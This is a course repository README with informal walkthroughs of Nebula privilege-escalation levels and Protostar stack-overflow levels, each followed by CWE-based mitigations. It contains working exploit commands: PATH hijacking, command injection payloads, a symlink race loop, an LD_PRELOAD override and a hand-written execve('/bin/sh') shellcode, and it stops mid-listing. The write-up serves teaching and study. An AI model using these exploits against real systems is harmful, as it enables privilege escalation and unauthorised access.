# SECPROG-Unisa
Solutions for Nebula and Protostar CTFs for the Secure Programming course of the Master's Degree in Cybersecurity of Unisa.

This repository aims to provide straightforward and simple EXPLANATIONS for solving Nebula and Protostar CTFs presented during the Secure Programming Course of the Master's Degree in Cybersecurity of Unisa. I'm not just dropping a script, I'm explaining what the hell I'm doing.

Beware: I'm really informal here, and I'm not interested in sounding professional. If you're sensitive to slurs, slang and shit, just go away and study somewhere else. If you are an HR, this is not my CV. Take this file as a "friendly yapping about CTFs".

In this course, these CTFs were solved:
- nebula-level00;
- nebula-level01;
- nebula-level02;
- nebula-level04;
- nebula-level07;
- nebula-level10;
- nebula-level13;
- protostar-stack0;
- protostar-stack1;
- protostar-stack2;
- protostar-stack3;
- protostar-stack4;
- protostar-stack5;

## NEBULA

### Before we start: An intro to SETUID
Usually on linux three kinds of permissions are available: `read`, `write` and `execute`. These permissions can be assigned to the owner, the group and to other users, usually making a tiplet of permissions.

Actually another kind of permission setting is provided: `setuid` (and `setgid`), that enables the program to be temporarly executed with the permission of the owner.

For instance, if a program with owner `root` has the `setuid` permission, an unprivileged user can (temporarily) run such program with the permissions of `root`.

If these `setuid` programs aren't carefully designed, they can pose a security risk.

Nebula's CTFs are almost entirely based on this mechanism. We find a `setuid` executable, we analyze it to find programming mistakes and we leverage these weaknesses to execute an arbitrary program (in this case the `/bin/getflag` executable) with higher privileges.

### Level 00

This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.

Alternatively, look at the find man page.

To access this level, log in as level00 with the password of level00.

So let's log in as level00. We can use the `find` command with appropriate parameters to search for an SUID executable.

```
level00@nebula:~$ find / -perm /u+s 2>/dev/null
/bin/.../flag00
...
```

The `/bin/.../flag00` executable looks suspicious. Let's try executing it.

```
level00@nebula:~$ /bin/.../flag00 
Congrats, now run getflag to get your flag!
```

Gotcha! Now we just have to run `/bin/getflag`.

```
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
```

Success.

### Level 01

There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

Let's log in as level01. We'll check what's inside `/home/flag01`.

```
level01@nebula:~$ cd /home/flag01
level01@nebula:/home/flag01$ ls -la
total 13
...
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
...
```

We have an SUID executable! Let's try running it.

```
level01@nebula:/home/flag01$ ./flag01 
and now what?
```

Nothing happens.

Examining the source code we can notice something interesting.

```
system("/usr/bin/env echo and now what?");
```

Let's have a glance at the `man system` entry:.

"system()  executes  a  command specified in command by calling /bin/sh -c command, and returns after the command has  been  completed."

Reading further, the NOTES sections reveals something pretty interesting:

"Do  not  use  system()  from  a  program  with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert system integrity."

So what environment variable can we use to get freaky?

Actually, when using a command without giving the full path of the executable, the `PATH` variable is used to search for such command in these paths.

In our program the `echo` command is called in such way.

To win this level the solution is pretty straightforward:
1. Copy `/bin/getflag` into a temporary directory as "echo" (i.e. `/tmp/echo`);
2. Add `/tmp/` as first directory into the `PATH` variable;
3. Run `./flag01` with the updated `PATH` and the fake `echo`.

Let's do this:
```
level01@nebula:/home/flag01$ cp /bin/getflag /tmp/echo
level01@nebula:/home/flag01$ PATH=/tmp/:${PATH} ./flag01 
You have successfully executed getflag on a target account
```

Success.

#### Mitigations

The weaknesses are:
1. CWE-276 Incorrect Default Permissions: The executable has `setuid` when it's not needed.
2. CWE-272 Least Privilege Violation: The shell used in Nebula does not lower the privileges.
3. CWE-426 Untrusted Search Path: A critical resource (i.e. `echo`) is searched through an untrusted value (i.e. `PATH`).

To mitigate the attack vectors on this executable, we could:
1. Remove the SETUID;
2. Install a shell that does lower the privileges;
3. Use `putenv()` before the call to system to modify the path to a safe value.

### Level 02

There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

Let's log in as level02 and launch the `/home/flag02/flag02` executable.

```
level02@nebula:~$ /home/flag02/flag02 
about to call system("/bin/echo level02 is cool")
level02 is cool
```

The program uses the system to launch a command that is prepared using a buffer.

The command is `/bin/echo USER is cool` where `USER` is the content of the `USER` environment variable.

We can't leverage the solution of Level 01 because `echo` is called using its absolute path, but we can do something else.

We can modify the USER variable to inject a command. If we set it to `; getflag`, the resulting system command will execute getflag after the semicolon.

Let's try it:

```
level02@nebula:~$ USER="; getflag" /home/flag02/flag02 
about to call system("/bin/echo ; getflag is cool")

You have successfully executed getflag on a target account
```

Success.

#### Mitigations

The weaknesses are:
1. CWE-276 Incorrect Default Permissions: The executable has `setuid` when it's not needed.
2. CWE-272 Least Privilege Violation: The shell used in Nebula does not lower the privileges.
3. CWE-77 Improper Neutralization of Special Elements used in a Command ('Command Injection'): It is possible to append special characters to a command.

To mitigate the attack vectors on this executable, we could:
1. Remove the SETUID;
2. Install a shell that does lower the privileges;
3. Use a blacklist or use `getlogin()` to get the username.

### Level 04
This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)

To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

First things first, let's log in as level04 and check the content of `/home/flag04/flag04`:

```
level04@nebula:/home/flag04$ ls -la
total 13
...
-rwsr-x--- 1 flag04 level04 7428 2011-11-20 21:52 flag04
...
-rw------- 1 flag04 flag04    37 2011-11-20 21:52 token
```

We have the `flag04` executable and the `token` file, which is our target.

We don't have the perms needed to read the file, but we can try to read it using `flag04`:

```
level04@nebula:/home/flag04$ ./flag04 token 
You may not access 'token'
```

We got an error. Analyzing the source code, we can't read the file because its name contains "token". We can't even copy it because we don't have the perms to do so.

Let's read the manual of `open`:

"Given a pathname  for a file, open() returns a file descriptor".

No shit Sherlock. But actually that's a fair point, because if we read further:

"**O_NOFOLLOW** If pathname is a symbolic link, then the open fails".

Our `open` does not use the `O_NONFOLLOW` option. That means we can open a symlink?

Let's create a link to the `token` file and let's use it as argument for `./flag04`:

```
level04@nebula:/home/flag04$ ln token /home/level04/tkn
level04@nebula:/home/flag04$ ./flag04 /home/level04/tkn 
06508b5e-8909-4f38-b630-fdb148a848a2
```

Now we can use this token to log in as flag04 and win the CTF:

```
level04@nebula:/home/flag04$ ssh flag04@localhost
...
flag04@localhost's password: 06508b5e-8909-4f38-b630-fdb148a848a2
...
flag04@nebula:~$ getflag
You have successfully executed getflag on a target account
```

Success.

#### Mitigations

The weaknesses are:
1. CWE-276 Incorrect Default Permissions: The executable has `setuid` when it's not needed.
2. CWE-272 Least Privilege Violation: The shell used in Nebula does not lower the privileges.
3. CWE-61 Unix Symbolic link (Symlink) Following: the `open()` "follows" a symlink with different permissions than the file it refers to.

To mitigate the attack vectors on this executable, we could:
1. Remove the SETUID;
2. Install a shell that does lower the privileges;
3. Add `O_NONFOLLOW` to the `open()`.

### Level 07

The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.

To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.

```
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

Let's log in as level07 and let's try to execute the file.

```
level07@nebula:/home/flag07$ ./index.cgi Host=8.8.8.8
Content-type: text/html

<html><head><title>Ping results</title></head><body><pre>PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_req=1 ttl=255 time=88.8 ms
64 bytes from 8.8.8.8: icmp_req=2 ttl=255 time=112 ms
64 bytes from 8.8.8.8: icmp_req=3 ttl=255 time=135 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2001ms
rtt min/avg/max/mdev = 88.805/112.191/135.258/18.967 ms
```

As expected we get the result of the ping command to Google's DNS (8.8.8.8).

Analyzing the source code, we see that the `Host` parameter is appended to `ping` command. Can we perform an injection here?

Let's try appending `getflag` to our `Host` string:

```
level07@nebula:/home/flag07$ ./index.cgi Host=8.8.8.8; getflag
...
64 bytes from 8.8.8.8: icmp_req=1 ttl=255 time=98.6 ms
64 bytes from 8.8.8.8: icmp_req=2 ttl=255 time=119 ms
64 bytes from 8.8.8.8: icmp_req=3 ttl=255 time=40.6 ms
...
</pre></body></html>getflag is executing on a non-flag account, this doesn't count
```

`getflag` is executed, but not as flag07...

Let's see what's inside `/home/flag07`:

```
level07@nebula:/home/flag07$ ls -la
total 10
...
-rwxr-xr-x 1 root   root     368 2011-11-20 21:22 index.cgi
...
-rw-r--r-- 1 root   root    3719 2011-11-20 21:22 thttpd.conf
```

The `thttpd.conf` file looks suspicious. Do we have some kind of services here? Let's open another terminal and `nmap` the machine:

```
nmap 192.168.56.101                                                            
...
PORT     STATE SERVICE
22/tcp   open  ssh
7007/tcp open  afs3-bos
...
```

We do! Port 7007 is open.

Checking the content of `thttpd.conf`, we can notice an interesting line:

```
# Specifies what user to switch to after initialization when started as root.
user=flag07
```

So the program is executing as flag07 if it's a service. What if we try to contact this service from a remote host?

We can craft a `GET` request for `index.cgi?Host=8.8.8.8;/bin/getflag`.

Let's check the ASCII encoding for ";" and "/":
- ; -> 3B
- / -> 2F

So the string should look like this:

`GET index.cgi?Host=8.8.8.8%3B%2Fbin%2Fgetflag`

Let's use `nc` to communicate with the service:

```
nc 192.168.56.101 7007
GET /index.cgi?Host=8.8.8.8%3B%2Fbin%2fgetflag                   
...
You have successfully executed getflag on a target account
...  
```

Success.

#### Mitigations

The weaknesses are:
1. CWE-250 Execution with Unnecessary Privileges: The webserver executes as `flag07` when it's not needed.
3. CWE-77 Improper Neutralization of Special Elements used in a Command ('Command Injection'): It is possible to append special characters to a command.

To mitigate the attack vectors on this executable, we could:
1. Edit `thttpd.conf` such as the server root is `/home/level07` and the executing user is `level07`.
3. Use a blacklist, actually in this case a regex to check if the input is an IP.

### Level 10

The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.

To do this level, log in as the level10 account with the password level10. Files for this level can be found in /home/flag10.

```
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```

Let's log in as level10. 

The target program basically sends a file to the host specified by the user.

So, to execute the program we should set the file as first argument and the host as second argument.

Let's run `nc -lvnp 18211` on another terminal to listen to incoming connections and use `./flag10` to send a file we know we have access to (i.e. `/etc/passwd`):

```
level10@nebula:/home/flag10$ ./flag10 /etc/passwd 192.168.56.1
Connecting to 192.168.56.1:18211 .. Connected!
Sending file .. wrote file!
```

We successfully sent the file using `./flag10` executable. I'm not printing the results because `/etc/passwd` is quite long...

Checking the content of `/home/flag10` we can notice again a `token` file.

```
level10@nebula:/home/flag10$ ls -la
total 14
...
-rwsr-x--- 1 flag10 level10 7743 2011-11-20 21:22 flag10
...
-rw------- 1 flag10 flag10    37 2011-11-20 21:22 token
```

We can't read it, and we can't send it using `./flag10` because `access(argv[1], R_OK)` checks the permissions.

Can we do something else? Let's read `man access`:

"access() checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced".

So if we use a symlink it's dereferenced, nice to know. Let's read further:

"Using  access()  to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates  a  security  hole,  because the user might exploit the  short time interval between checking and opening  the  file  to  manipulate  it."

That's actually called "TOC-TOU Weakness".

The access checks the permission of the file linked to the symlink. If we use a file we can't access, such as the `token` file, the `access()` would return an error. 

But if we create a new fake file, we can swap the pointers during the time span between the `access()` and the `open()`.

The idea is to:
1. Create a `/tmp/faketoken` file we can access;
2. Create a `/tmp/link` symlink that points to 'tmp/faketoken';
3. Pass `/tmp/link -> /tmp/faketoken` to the `access()`;
4. Update `/tmp/link` to point to `/home/flag10/token` before the `open()`;
5. Pass `tmp/link -> /home/flag10/token` to the `open()`;

This way, we can use `./flag10` to send the `token` file to another terminal and read its content.

Let's create the fake file: `touch /tmp/faketoken`.

Now we can write a simple script to help us to do the swapping thing:

```
while true; 
do 
    ln -sf /home/flag10/token /tmp/link;
    ln -sf /tmp/faketoken /tmp/link; 
done &
```

We can also write it as a one-liner:

```
while true; do ln -sf /home/flag10/token /tmp/link; ln -sf /tmp/faketoken /tmp/link; done &
```

Let's run it:

```
level10@nebula:/home/flag10$ touch /tmp/faketoken
level10@nebula:/home/flag10$ while true; do ln -sf /home/flag10/token /tmp/link; ln -sf /tmp/faketoken /tmp/link; done &
[1] 3700
```

Now we just have to use `/tmp/link` as argument of `./flag10`, trying multiple runs in hope that the `access()` gets the `faketoken` and the `open()` gets the `token`.

Let's write an infinite loop to help us accomplish what we just said:

```
while true; do /home/flag10/flag10 /tmp/link 192.168.56.1; done
```

Let's run `nc -lvnp 18211` on the helper terminal again, then we can run the attack:

I wasn't able to catch the moment where the file is sent on the host machine, but on the helper terminal we can clearly check the attack was successful:

```
nc -lvnp 18211
Connection from 192.168.56.101:54140
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```

Now we just have to use this string to log in as flag10 and run `/bin/getflag`:

```
...
flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
...
```

Success.

#### Mitigations

The weaknesses are:
1. CWE-276 Incorrect Default Permissions: The executable has `setuid` when it's not needed.
2. CWE-272 Least Privilege Violation: The shell used in Nebula does not lower the privileges.
3. CWE-367 Time-of-check Time-of-use (TOCTOU) Race Condition: The `access()` verifies the permissions but the `open()` could open a different file than the one authorized by `access()`.

To mitigate the attack vectors on this executable, we could:
1. Remove the SETUID;
2. Install a shell that does lower the privileges;
3. The effective UID and GID should be set as the current user and group when the `open()` is performed.

### Level 13

There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.

To do this level, log in as the level13 account with the password level13. Files for this level can be found in /home/flag13.

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <string.h>

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
  int c;
  char token[256];

  if(getuid() != FAKEUID) {
      printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
      printf("The system administrators will be notified of this violation\n");
      exit(EXIT_FAILURE);
  }

  // snip, sorry :)

  printf("your token is %s\n", token);
  
}
```

Log in into level13.

Checking the source code, the `./flag13` executable prints a token file if and only if the `UID` of the user that run the program is 1000.

The solution here is pretty freaky and fun.

Let's read `man ld.so`:

LD_PRELOAD: A whitespace-separated list of additional, user-specified, ELF  shared  libraries  to  be loaded  before  all  others.  This can be used to selectively override functions in other shared libraries.  For setuid/setgid ELF binaries, only libraries in the standard  search directories that are also setgid will be loaded.

So if our executable is compiled with shared libraries, we could:
1. Write a fake `getuid()` that always returns 1000;
2. Compile it as a shared library;
3. Use `LD_PRELOAD` to override the function with the fake one;

Another important point is that the executable and the library must both be either SETUID or not.

If we write this fake library, it wouldn't be SETUID, so we have to copy the `./flag13` executable in order to execute it with the fake library.

Let's do everything we need to perform the attack:

First thing first, the fake library:

```
level13@nebula:~$ touch getuid.c
level13@nebula:~$ echo "int getuid(){return 1000;}" > getuid.c
gcc -shared -fPIC -o getuid.so getuid.c
```

Now we have to copy the `./flag13` executable and run it with `LD_PRELOAD` set:

```
level13@nebula:~$ cp /home/flag13/flag13 /home/level13/flag13
level13@nebula:~$     LD_PRELOAD=/home/level13/getuid.so /home/level13/flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
```

We did it! Now we just have to run `/bin/getflag` as flag13:

```
...
flag13@nebula:~$ getflag
You have successfully executed getflag on a target account
...
```

Success.

#### Mitigations

The weaknesses are:
1. CWE-426 Untrusted Search Path: A critical resource (i.e. `getuid()`) is searched through an untrusted value (i.e. `LD_PRELOAD`).
2. CWE-90 Authentication Bypass by Spoofing: The UID is known and can be spoofed easily.

To mitigate the attack vectors on this executable, we could:
1. Do nothing. `LD_PRELOAD` works before the executable is launched.
2. The authentication is dumb. The value is known and it's easily spoofable. A better authentication mechanism should be used.

## Protostar

### Before we start...
Let’s check the machine’s OS and architecture since we’ll be working with memory and shit:

```
user@protostar:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 6.0.3 (squeeze)
Release:        6.0.3
Codename:       squeeze
user@protostar:~$ arch
i686
```

We're on Debian 6.0.3 and the machine is 32-bit. Nice to know.

### Stack 0

This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

This level is at /opt/protostar/bin/stack0

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

To solve this level we have to override the content of `modified` variable.

From analyzing the source code, we notice the use of `gets()`. This function is notoriously insecure, but let's read its `man` entry anyway:

"Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past  the  end of  the  buffer, it is extremely dangerous to use.  It has been used to break computer security".

Basically, if this function is used, then a buffer overflow attack is feasible.

We have to check whether the `buffer` and `modified` variables are in contiguous memory regions.

In fact, we can assume they do because of how the stack works on Linux systems. 
Variables are pushed on top of the stack in the declaration order. On our program `modified` is declared before `buffer`.

So if we override 65 bytes starting from the base address of `buffer`, we're overriding `modified`.

We just have to provide 65 characters to `./stack0`. I will use a simple Python script to accomplish this because I'm not a subhuman and I will not count 65 characters by hand:

```
user@protostar:/opt/protostar/bin$ python -c "print('a'*65)" | /opt/protostar/bin/stack0
you have changed the 'modified' variable
```

Success.

### Stack 1

This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

This level is at /opt/protostar/bin/stack1

Hints 
- If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend. 
- Protostar is little endian.

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

This time we have to override `modified` with a certain value. The source code suggests this value to us: `0x61626364`.

But what the heck is that? If you're not a script kiddie, you would know it's hexadecimal.

Let's read the `man ascii` entry to know which char these are:
- 0x61 -> "a"
- 0x62 -> "b"
- you get the point...

So we have to input `abcd` into `modified`.

How tf are we going to accomplish it without a `gets()`?

Actually this program uses the `strcpy()` function, which still doesn't check the size of the destination buffer.

So if `argv[1]` is 65 bytes and `buffer` is 64 bytes, it will still copy 65 bytes.

Anyway, if we're just going to put `abcd` into the variable, we would miserably fail, because Protostar is little endian. e have to reverse it; if it's not clear, the value should be `dcba`.

Let's perform the attack:

```
user@protostar:/opt/protostar/bin$ /opt/protostar/bin/stack1 `python -c "print('a' * 64 + 'dcba')"`
you have correctly got the variable to the right value
```

Success.

### Stack 2

Stack2 looks at environment variables, and how they can be set.

This level is at /opt/protostar/bin/stack2

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

This level is really stupid. You still have the insecure `strcpy()`, and the `modified` variable needs to be overwritten with `0x0d0a0d0a`.

To solve this one, simply `export GREENIE`. Its content will be copied into the buffer without any bounds checking.

Since the buffer is 64 bytes, you can provide the required bytes in a script. Remember to consider the byte order because Protostar is little endian.

```
user@protostar:/opt/protostar/bin$ export GREENIE=`python -c "print('a'*64 + '\x0a\x0d\x0a\x0d')"`
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
```

Success.

### Stack 3

Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

Hints
- both gdb and objdump is your friend determining where the win() function lies in memory.

This level is at /opt/protostar/bin/stack3

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

This level is essentially a dumb version of return address overwriting.

The `gets()` function allows us to perform a buffer overflow.

We have a function pointer fp adjacent to buffer. We need to find where win() is located in memory, which we can do using gdb. Once we have the address, we overwrite fp with it:

```
user@protostar:/opt/protostar/bin$ gdb -q ./stack3
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) p win
$1 = {void (void)} 0x8048424 <win>
```

So the `win()` function is located at `0x8048424`. Now we can use the same technique we've used before, writing this address in little endian format:

```
user@protostar:/opt/protostar/bin$ python -c "print('a'*64 + '\x24\x84\x04\x08')" | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

Success.

### Stack 4

Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

This level is at /opt/protostar/bin/stack4

Hints
- A variety of introductory papers into buffer overflows may help.
- gdb lets you do “run < input”
- EIP is not directly after the end of buffer, compiler padding can also increase the size.

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

This time the only variable declared in the main is `buffer`, and the win condition is still to change the code flow.

We don't have a function pointer or similar tricks this time, so we'll have to break things in another way.

Let's look at how the stack works on Protostar, and what the main does. Some knowledge of assembly is needed here:

```
user@protostar:/opt/protostar/bin$ gdb -q stack4
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) disass main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   %ebp
0x08048409 <main+1>:    mov    %esp,%ebp
0x0804840b <main+3>:    and    $0xfffffff0,%esp
0x0804840e <main+6>:    sub    $0x50,%esp
0x08048411 <main+9>:    lea    0x10(%esp),%eax
0x08048415 <main+13>:   mov    %eax,(%esp)
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave  
0x0804841e <main+22>:   ret    
End of assembler dump.
```

- Before the main the return address to `__libc_start_main` is pushed onto the stack; 
- The main is called;
- The old base frame pointer (`ebp`) is pushed onto the stack;
- `ebp` is updated to the current stack top (`esp`);
- A padding is applied due to Intel's convention;
- 80 bytes (`0x50`) of memory are allocated;
- The address of the buffer is calculated starting from the top of the stack (note that 16 + 64 = 80);
- the address of the buffer is moved onto top of the stack (not pushed!);
- `gets()` is called, and afterward, the main returns.

So the stack should look something like this:

```
+---------------------------------------------------------------------------------------------------------------------------------------+
| buffer ptr (4 bytes) | empty memory (12 bytes) | buffer (64 bytes) | padding (8 bytes) | old ebp (4 bytes) | return address (4 bytes) |  
+---------------------------------------------------------------------------------------------------------------------------------------+
```

Since we can write into the buffer, to reach the return addres we have to provide 64 + 8 + 4 = 76 bytes of padding before writing the address we want to jump to.

Let's just find the address of `win()` once again:

```
(gdb) p win
$1 = {void (void)} 0x80483f4 <win>
```

Now we can use the same script as in previous challenges:

```
user@protostar:/opt/protostar/bin$ python -c "print('a'*76 + '\xf4\x83\x04\x08')" | ./stack4
code flow successfully changed
Segmentation fault
```

Success.

### Stack 5

Stack5 is a standard buffer overflow, this time introducing shellcode.

This level is at /opt/protostar/bin/stack5

Hints

- At this point in time, it might be easier to use someone elses shellcode
- If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
- remove the int3s once your shellcode is done.

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Now we don't even have a function to jump to. We have to use a shellcode this time.

Can we exploit this executable to get a root shell? Let's check if it's SETUID:

```
user@protostar:/opt/protostar/bin$ ls -la stack5
-rwsr-xr-x 1 root root 22612 Nov 24  2011 stack5
```

It is! Our executable is SETUID and the owner is `root`. If we write a shellcode that opens a shell, such shell would be executing with root privileges!

If we could write it in C, it would be something like this:
```
execve(“/bin/sh”);
exit(0);
```

But if we put C code into the stack, it won't execute because it's not compiled. We have to write it in Assembly.

If you want to study because you want to be able to write your own shellcode in hope to not be a script kiddie anymore, you can learn something [here](https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux).

Anyway, let's have a glance at the `man execve` entry. We have to check what parameters are expected by the function:

```
...
int execve(const char *filename, char *const argv[], char *const envp[]);
...
```

So we have three parameters:
- `filename` will be `/bin/sh`;
- `argv` and `envp` will be `NULL`.

Before writing the shellcode, we have to pay attention to two things:
1. It must not contain null bytes, because they would be interpreted as string terminators;
2. It must be as big as the memory area we can override before the return address at max.

How big is such memory area? On this CTF the stack grows like the previous challenge:

```
+---------------------------------------------------------------------------------------------------------------------------------------+
| buffer ptr (4 bytes) | empty memory (12 bytes) | buffer (64 bytes) | padding (8 bytes) | old ebp (4 bytes) | return address (4 bytes) |  
+---------------------------------------------------------------------------------------------------------------------------------------+
```

So we still have 64 + 8 + 4 = 76 bytes before the return address. Our shellcode must be 76 bytes at max.

Let's write it:

```
shellcode:
    xor     %eax, %eax      # eax is zeroed (it will be useful)
    push    %eax            # "\0" is pushed
    push    $0x68732f2f     # encoding of "//sh" is pushed
    push    $0x6e69622f     # encoding of "/bin" is pushed
    mov     %esp, %ebx      # first argument of execve (the /bin//sh\0 string)
    mov     %eax, %ecx      # second argument of execve (NULL)
    mov     %eax, %edx      # third argument of execve (NULL)
    mov     $0xb, %al       # "11" is put into eax (11 is the code for execve)
    int     $0x80           # execve is called
    xor     %eax, %eax      # eax is zeroed again
    inc     %eax            # eax is incremented (1 is the code for exit)
    int     $0x80           # exit is called
```

Now we can compile it:

```
gcc -m32 -c shellcode.s -o shellcode.o
```

We have to put the hexadecimal into the stack. We can obtain it with `objdump`:

```
user@protostar:~$ objdump --disassemble shellcode.o

shellcode.o:     file format elf32-i386

Disassembly of section .text:

00000000 <shellcode>:
   0:   31 c0                   xor    %eax,%eax
   2:   50                      push   %eax
   3:   68 2f 2f 73 68          push   $0x68732f2f
   8:   68 2f 62 69 6e          push   $0x6e69622f
   d:   89 e3                   mov    %esp,%ebx
   f:   89 c1                   mov    %eax,%ecx
  11:   89 c2                   mov    %eax,%edx
  13:   b0 0b                   mov    $0xb,%al
